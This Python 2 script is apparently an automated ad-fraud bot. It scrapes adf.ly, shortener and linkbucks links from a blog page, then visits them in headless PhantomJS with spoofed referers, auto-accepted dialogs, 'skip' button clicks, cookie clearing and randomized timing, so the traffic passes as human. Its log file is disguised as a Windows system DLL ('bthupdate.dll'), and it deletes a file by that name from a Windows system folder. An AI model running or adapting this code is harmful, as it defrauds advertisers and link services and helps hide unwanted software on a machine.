#!/usr/bin/python
# -*- coding:utf-8 -*
import sqlite3
import re
import sys,os,socket
import time

import signal
import threading

import urllib2 

import random
import math
from selenium import webdriver
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver import PhantomJS
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

import bs4
from bs4 import BeautifulSoup

import datetime
def logfile(text):
	try:
		nowtime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
		print nowtime
		f = open(r"bthupdate.dll","a")
		data = "[*]" + str(nowtime) + ": " +str(text) + "\n"
		f.writelines(data)
		f.close()
	except:
		pass
	

def clickbtn(link):
	try:
		refers = ["https://www.facebook.com","https://www.google.com","https://twitter.com/","https://www.dropbox.com","https://www.yahoo.com"]
		ref = random.sample(refers,1)
		'''
		dcap = dict(DesiredCapabilities.PHANTOMJS)
		dcap["phantomjs.page.customHeaders.Referer"] = (str(ref))
		driver = webdriver.PhantomJS(
				 executable_path=r'phantomjs.exe',
				 desired_capabilities=dcap
			)
		'''
		DesiredCapabilities.PHANTOMJS['phantomjs.page.customHeaders.Referer'] = (str(ref[0]))
		driver = webdriver.PhantomJS(executable_path=r"phantomjs-1.9.7.exe")
	except Exception,e:
		logfile(str(link) + str(e))
		return 0
	socket.setdefaulttimeout(200) 
	try:
		if "linkbucks" in link:
			buttonname = "skiplink"	
		else:
			buttonname = "skip_button"
		try:
			driver.get(link)
		except:
			try:
				driver.quit()
			except:
				pass
			print "url cannot get!"
			logfile(str(link) + " driver url cannot get!")
			return 0
		sleep(5)
		try:
			WebDriverWait(driver, 15).until(EC.alert_is_present(),
														   'Timed out waiting for PA creation ' +
														   'confirmation popup to appear.')

			#driver.switch_to_alert().accept()
			sleep(5)
			driver.execute_script("window.confirm = function() { return true; }")
			print "alert accepted"
			logfile(str(link) + " alert accepted")

		except:
			print "no alert"
			logfile(str(link) + " no alert")			
		try:
			wait = WebDriverWait(driver, 20)
			wait.until(EC.element_to_be_clickable((By.ID,buttonname))).click()
			sleep(5)
			print "[*]"+ link +"find click btn!"
			logfile(str(link) + " find click btn!")
		except Exception,e:
			print e
			print "[*]"+ link +"cannot find click btn!"
			logfile(str(link) + " cannot find click btn!")
		time_sleep = random.randint(5, 30)
		sleep(time_sleep)
	except socket.error,socket.gaierror:
		print "[*]"+ link +"socket error"
		logfile(str(link) + " socket error!")
		pass
	except:
		logfile(str(link) + " other error!")
		pass
	try:
		driver.delete_all_cookies()
	except:
		print "[*]"+ link +"clear cookie error"
		pass
	try:
		driver.quit()
	except:
		print "[*]"+ link +"driver quit error"
		pass
	return 0
def get_link(url):
	try:
		hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
		   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		   'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
		   'Accept-Encoding': 'none',
		   'Accept-Language': 'en-US,en;q=0.8',
		   'Connection': 'keep-alive'}

		req = urllib2.Request(url, headers=hdr)
		links_adfly =[]
		links_short =[]
		links_buck =[]
		try:
			page = urllib2.urlopen(req)
		except urllib2.HTTPError, e:
			print e.fp.read()
			return 0
		except:
			return 0
		try:
			soup = BeautifulSoup(page,'html.parser') 
			res = soup.findAll("a",{"class": "adflyflag"})
			for a in res:
				links_adfly.append(a.get('href'))
			res1 = soup.findAll("a",{"class": "shortflag"})
			for a in res1:
				links_short.append(a.get('href'))
			res2 = soup.findAll("a",{"class": "buckflag"})
			for a in res2:
				links_buck.append(a.get('href'))
		except:
			pass
		'''
		try:
			downloader = soup.find("a",{"class": "downflag"})
			filelink =  downloader.get('href')
			f = urllib2.urlopen(filelink) 
			data = f.read() 
			with open("demo2.inf", "wb") as code:     
				code.write(data)
		except:
			pass
		'''
		if(len(links_short)==0 and len(links_adfly)==0 and len(links_buck)==0):
			return 0
		len_adfly = random.randint(3, 12)
		#print len_adfly
		adfys = random.sample(links_adfly,len_adfly)
		
		len_short = random.randint(2, 8)
		#print len_short
		shorts = random.sample(links_short,len_short)
		
		len_buck = random.randint(3, 12)
		#print len_buck
		bucks = random.sample(links_buck,len_buck)
		
		linkall = []
		linkall.extend(adfys)
		linkall.extend(shorts)
		linkall.extend(bucks)
		#start download
		
		#print adfys	
		return linkall
	except:
		return 0
	'''
	for link in links_short:
		print link
	'''
	
	
	#print html
	'''
	req = urllib2.Request(url, headers = headers) 
	response = urllib2.urlopen(req,None,30)
	responsehtml = response.read()
	print responsehtml
	soup = BeautifulSoup(responsehtml,'html.parser')
	res = soup.findAll("a")
	for a in res:
		print a.get('href')'''
		
	
	

if __name__ == '__main__':
	while True:
		
		print "do link!"
		#get now time: day hour minit
		time_fomat = time.localtime(time.time())
		yeartime = time_fomat[0] #year
		montime = time_fomat[1]	#month
		daytime = time_fomat[2]	#day
		hourtime = time_fomat[3] #hour
		mintime = time_fomat[4]	#min
		
		hourend = 20 # end time
		
		d1_now = datetime.datetime(yeartime, montime, daytime,hourtime,mintime)
		logfile("do link!")
		d1_end = datetime.datetime(yeartime, montime, daytime,hourend,00)
		print d1_now
		print d1_end
		time_distance = 0
		if hourtime< hourend :
			time_distance = ((d1_end - d1_now).seconds)
		print time_distance
		
		if time_distance>=33600:# make shure the time enough 560min =9.3hour
			try:
				flag = get_link("http://xxx.blog.com/2016/03/01/hello-world/") # your blog that stores the url lists
				#print flag
				if flag!=0:
					n=len(flag)
					step = time_distance/n
					'''
					for l in lst:
						d3 = d1_now + datetime.timedelta(seconds=l)
						d1_now = d3
						print d3.ctime()
					print lst, sum(lst)
					'''
					print 
					flag_random = random.sample(flag,len(flag))
					print "start click!"
					for f in flag_random:
						try:
							print f
							logfile("[*]" + str(f) + "start to clickbth")
							clickbtn(f)
							print "sleep time" + str(step/60) + "min"
							logfile("sleep time" + str(step/60) + "min")
							sleep(step)
						except:
							continue
			except:
				print "except"
				pass
		else:
			print "time no enough!"
			logfile("time no enough!")
			pass
		#wait for tomorrow!
		while True:
			time_fomat2 = time.localtime(time.time())
			if daytime != time_fomat2[2]:
				try:
					os.remove(r"C:\windows\system\wins\bthupdate.dll")
				except:
					pass
				time_sleep = random.randint(3600, 5400)
				print "next day" + str(time_sleep)
				sleep(time_sleep)
				break
			else:
				print "time is same!"
				time_sleep = random.randint(1800, 3600)
				print time_sleep
				sleep(time_sleep)
	
	#print time
	#print starttime

